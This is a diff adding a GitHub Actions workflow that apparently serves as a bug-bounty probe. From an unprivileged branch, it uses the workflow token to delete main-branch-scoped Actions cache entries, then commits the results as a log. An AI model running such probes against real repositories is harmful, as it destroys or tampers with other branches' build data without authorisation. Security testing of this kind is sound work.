@@ -1,0 +1,29 @@
+name: del-probe
+on:
+  push:
+    branches:
+      - 'cbdel/**'
+permissions:
+  contents: write
+  actions: write
+jobs:
+  deljob:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: delete direction from an unprivileged ref holding repo level actions write
+        run: |
+          N="$(cat NONCE.txt)"
+          A=(-sS -H "Authorization: Bearer ${{ github.token }}" -H "X-HackerOne: larocas" -H "Accept: application/vnd.github+json")
+          B="https://api.github.com/repos/${{ github.repository }}/actions/caches"
+          {
+          echo "ref=${{ github.ref }}"
+          echo "BEFORE: $(curl "${A[@]}" "$B?per_page=100" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['total_count'],[ (c['ref'],c['key']) for c in d['actions_caches'] if c['key']=='cbmain-'+'$N'])")"
+          echo "DEL by key+ref refs/heads/main -> $(curl "${A[@]}" -o /tmp/d1 -w '%{http_code}' -X DELETE "$B?key=cbmain-$N&ref=refs/heads/main") $(head -c 200 /tmp/d1)"
+          echo "DEL by id of a main scoped entry -> "
+          ID=$(curl "${A[@]}" "$B?per_page=100" | python3 -c "import sys,json;d=json.load(sys.stdin);print(next((c['id'] for c in d['actions_caches'] if c['ref']=='refs/heads/main'),''))")
+          echo "  target id=$ID -> $(curl "${A[@]}" -o /tmp/d2 -w '%{http_code}' -X DELETE "$B/$ID") $(head -c 200 /tmp/d2)"
+          echo "AFTER: $(curl "${A[@]}" "$B?per_page=100" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['total_count'],[ (c['ref'],c['key']) for c in d['actions_caches'] if c['key']=='cbmain-'+'$N'])")"
+          } | tee /tmp/del.txt
+          curl "${A[@]}" -X PUT "https://api.github.com/repos/${{ github.repository }}/contents/cb_del_${{ github.run_id }}.log" \
+            -d "$(python3 -c "import json,base64;print(json.dumps({'message':'lane a7 del','content':base64.b64encode(open('/tmp/del.txt','rb').read()).decode()}))")" -o /dev/null -w "put=%{http_code}\n"
